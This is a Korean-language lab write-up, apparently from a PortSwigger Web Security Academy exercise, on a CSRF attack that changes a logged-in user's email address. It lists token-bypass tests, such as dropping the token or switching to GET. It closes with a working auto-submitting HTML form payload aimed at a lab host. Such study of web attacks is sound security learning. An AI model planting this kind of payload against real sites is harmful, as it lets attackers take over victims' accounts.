## 🕵️‍♂️ 이메일 주소 변경하는 공격

*CSRF (Cross-site Request Forgery)* <br />
*사용자가 로그인된 웹사이트에서 의도하지 않은 요청(비밀번호 변경, 송금)을 보내도록 만드는 웹 보안 공격* <br />

<br />

### 🧪 실습

**1️⃣ 취약점 확인**

POST 메서드로 데이터를 전송하고 있다. <br />
<img width="1512" height="153" alt="image" src="https://github.com/user-attachments/assets/0abde10e-203b-41db-815a-31595eef1693" /><br /><br />

예측 불가능한 파라미터 `csrf` 를 가지고 있다. <br />
<img width="462" height="107" alt="image" src="https://github.com/user-attachments/assets/684ae88b-8fd9-49cf-b1fc-bdc0eb97a5e3" /><br /><br />

**테스트 확인** <br />
✓ 임의의 csrf 값을 넣고 POST 요청 시도: 제대로 토큰을 검증하고 있는지 <br />
✓ csrf 제거하고 POST 요청 시도: 토큰이 없을 때 오류가 나는지  <br />
✓ csrf 제거하고 GET 요청: GET 메서드로 데이터 전송이 가능한지 <br />

취약점이 없어보이지만 <br />
✓ GET 에서는 CSRF 토큰을 검증하지 않는 경우가 많다.<br />
✓ 불분명한 파라미터를 제외하고 요청 가능할 수 있다.


<br />

**2️⃣ 임의의 이메일 주소를 저장하는 익스플로잇 HTML 삽입**

페이지가 로딩될 때, 자동으로 이메일 변경 양식을 제출할 수 있다.

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> // GET 
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```
